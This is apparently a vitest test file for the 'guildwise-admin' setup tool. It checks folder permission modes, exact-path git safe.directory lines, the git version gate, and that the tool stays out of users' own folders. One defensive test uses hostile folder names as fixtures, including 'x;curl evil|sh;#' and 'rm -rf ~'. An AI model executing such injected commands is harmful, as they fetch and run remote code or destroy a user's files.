import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  statSync,
  writeFileSync,
} from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  clonesDir,
  ensureClonesDir,
  gitVersionAtLeast,
  safeDirectoryCommand,
} from '../src/setup/workspace.ts';
import { ADMIN_FILE, ALICE, admin, fakeSystem, RUNNER } from './admin/fake-system.ts';

function allModes(dir: string): Array<[string, number]> {
  const out: Array<[string, number]> = [[dir, lstatSync(dir).mode]];
  for (const e of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, e.name);
    if (e.isDirectory()) out.push(...allModes(p));
    else out.push([p, lstatSync(p).mode]);
  }
  return out;
}

describe('own clones only [rv6-3]', () => {
  it('the clones live under the runner HOME', () => {
    expect(clonesDir('/home/guildwise-runner', 'dedicated')).toBe('/home/guildwise-runner/src');
    expect(clonesDir('/home/alice', 'current')).toBe('/home/alice/guildwise-runner/src');
  });

  it('the clones folder is created 0700 and an existing one loses group/other write and setgid', () => {
    const f = fakeSystem();
    const fresh = join(f.root, 'home/r/src');
    expect(ensureClonesDir(fresh)).toBe(0o700);
    expect(statSync(fresh).mode & 0o7777).toBe(0o700);
    const shared = join(f.root, 'shared');
    mkdirSync(shared);
    chmodSync(shared, 0o2777);
    ensureClonesDir(shared);
    const mode = statSync(shared).mode & 0o7777;
    expect(mode & 0o2022).toBe(0);
  });

  it('neither the root tool nor setup ever makes a setgid or group/other-writable folder', () => {
    const texts = [
      readFileSync(ADMIN_FILE, 'utf8'),
      ...['setup.ts', 'workspace.ts', 'command.ts', 'policy-file.ts'].map((f) =>
        readFileSync(join(import.meta.dirname, '../src/setup', f), 'utf8'),
      ),
    ];
    const literals: string[] = [];
    for (const t of texts) {
      // every mode literal handed to mkdir/chmod/open/write calls
      for (const m of t.matchAll(
        /(?:mode:\s*|chmodSync\([^,()]+,\s*|ensureOwnedDir\([^)]*,\s*|writeRootFile\([^)]*,\s*|writeUserFile\([^)]*,\s*)(0o[0-7]+)/g,
      ))
        literals.push(m[1] as string);
      expect(t).not.toMatch(/g\+s|g\+w|setgid\s*=\s*true/);
    }
    expect(literals.length).toBeGreaterThan(5);
    for (const l of literals) expect(Number.parseInt(l.slice(2), 8) & 0o7022, l).toBe(0);
  });

  it('safe.directory is the exact path, never a wildcard; the fetch route needs git >= 2.45.1', () => {
    expect(safeDirectoryCommand('/home/guildwise-runner/src/shop')).toBe(
      'git config --global --add safe.directory /home/guildwise-runner/src/shop',
    );
    expect(() => safeDirectoryCommand('*')).toThrow();
    expect(() => safeDirectoryCommand('/home/guildwise-runner/src/*')).toThrow();
    expect(gitVersionAtLeast('git version 2.45.1')).toBe(true);
    expect(gitVersionAtLeast('git version 2.53.0')).toBe(true);
    expect(gitVersionAtLeast('git version 2.45.0')).toBe(false);
    expect(gitVersionAtLeast('git version 2.39.5')).toBe(false);
    expect(gitVersionAtLeast('')).toBe(false);
  });
});

describe('guildwise-admin readers: read-only git fetch from the runner clones [rv6-3, rv7-13]', () => {
  function withClones(git?: string) {
    const f = fakeSystem({ users: [RUNNER, ALICE], git });
    const src = join(f.root, RUNNER.home, 'src');
    mkdirSync(join(src, 'shop/.git/hooks'), { recursive: true });
    writeFileSync(join(src, 'shop/.git/config'), '[core]\n', { mode: 0o664 });
    writeFileSync(join(src, 'shop/build.sh'), '#!/bin/sh\n', { mode: 0o775 });
    chmodSync(join(src, 'shop'), 0o2775);
    mkdirSync(join(f.root, ALICE.home, 'code'), { recursive: true });
    return { ...f, src };
  }

  it('makes the clones group-readable for guildwise-readers, never writable or setgid, and prints exact safe.directory lines', async () => {
    const f = withClones();
    expect(await admin.main(['readers', 'add', 'alice'], f.sys)).toBe(0);
    expect(f.calls).toContainEqual({ cmd: 'groupadd', args: ['--system', 'guildwise-readers'] });
    expect(f.calls).toContainEqual({ cmd: 'usermod', args: ['-aG', 'guildwise-readers', 'alice'] });
    for (const [p, mode] of allModes(f.src)) {
      expect(mode & 0o022, p).toBe(0);
      expect(mode & 0o7000, p).toBe(0);
      expect(mode & 0o040, p).toBe(0o040);
    }
    expect(statSync(join(f.src, 'shop/build.sh')).mode & 0o010).toBe(0o010);
    expect(statSync(join(f.root, RUNNER.home)).mode & 0o777).toBe(0o710);
    const out = f.out.join('\n');
    expect(out).toContain('git config --global --add safe.directory /home/guildwise-runner/src/shop');
    expect(out).not.toMatch(/safe\.directory \*/);
  });

  it("refuses any folder outside the runner's HOME (the person's folders are never touched)", async () => {
    const f = withClones();
    const before = statSync(join(f.root, ALICE.home, 'code')).mode;
    expect(await admin.main(['readers', 'add', 'alice', '--path', '/home/alice/code'], f.sys)).toBe(1);
    expect(f.err.join('\n')).toContain("only the runner's own clones");
    expect(statSync(join(f.root, ALICE.home, 'code')).mode).toBe(before);
  });

  it('never prints a hostile folder name as a paste-ready command', async () => {
    const f = withClones();
    for (const name of ['x;curl evil|sh;#', 'a b', "q'uote", 'nl\nrm -rf ~', 'esc\u001b[2J']) {
      mkdirSync(join(f.src, name, '.git'), { recursive: true });
    }
    expect(await admin.main(['readers', 'add', 'alice'], f.sys)).toBe(0);
    const lines = f.out.filter((l) => l.includes('safe.directory'));
    expect(lines).toEqual(['  git config --global --add safe.directory /home/guildwise-runner/src/shop']);
    const out = f.out.join('\n');
    expect(out).toContain('not listed (unusual characters in the folder name)');
    expect(out).not.toContain('curl evil|sh;#/');
    expect(out).not.toContain('\u001b');
  });

  it('shares only ~/src or below, never the HOME itself (the token and runner key live there)', async () => {
    const f = withClones();
    expect(await admin.main(['readers', 'add', 'alice', '--path', '/home/guildwise-runner'], f.sys)).toBe(1);
    expect(f.err.join('\n')).toContain('/home/guildwise-runner/src or below');
  });

  it('refuses with a git older than 2.45.1 and offers the remote route instead', async () => {
    const f = withClones('git version 2.43.0');
    expect(await admin.main(['readers', 'add', 'alice'], f.sys)).toBe(1);
    expect(f.err.join('\n')).toContain('needs git 2.45.1 or newer');
    expect(f.calls.some((c) => c.cmd === 'groupadd')).toBe(false);
  });

  it("migrate-user never writes into the person's folders: it only reads them", async () => {
    const f = fakeSystem({ users: [RUNNER, ALICE] });
    mkdirSync(join(f.root, ALICE.home, '.aom-runner'), { recursive: true });
    mkdirSync(join(f.root, ALICE.home, '.config/aom-runner'), { recursive: true });
    writeFileSync(join(f.root, ALICE.home, '.config/aom-runner/policy.json'), '{"version":1}');
    mkdirSync(join(f.root, RUNNER.home), { recursive: true });
    const before = allModes(join(f.root, ALICE.home)).map(([p, m]) => `${p}:${m}`);
    expect(await admin.main(['migrate-user', '--from', 'alice'], f.sys)).toBe(0);
    expect(allModes(join(f.root, ALICE.home)).map(([p, m]) => `${p}:${m}`)).toEqual(before);
    expect(existsSync(join(f.root, RUNNER.home, '.aom-runner'))).toBe(true);
  });
});
